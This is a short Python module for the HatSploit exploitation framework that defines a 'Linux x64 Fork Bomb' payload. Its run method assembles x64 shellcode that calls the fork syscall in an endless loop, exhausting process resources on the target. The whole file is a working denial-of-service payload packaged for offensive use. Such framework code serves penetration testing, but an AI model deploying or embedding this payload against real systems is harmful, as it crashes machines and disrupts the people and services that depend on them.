"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.payload.basic import *
from pex.assembler import Assembler


class HatSploitPayload(Payload, Assembler):
    def __init__(self):
        super().__init__()

        self.details.update({
            'Name': "Linux x64 Fork Bomb",
            'Payload': "linux/x64/fork_bomb",
            'Authors': [
                'Ivan Nikolskiy (enty8080) - payload developer',
            ],
            'Description': "Fork bomb payload for Linux x64.",
            'Arch': ARCH_X64,
            'Platform': OS_LINUX,
            'Type': OneSide,
        })

    def run(self):
        return self.assemble(
            self.details['Arch'],
            """
            start:
                push 0x39
                pop rax
                syscall
                jmp start
            """,
        )
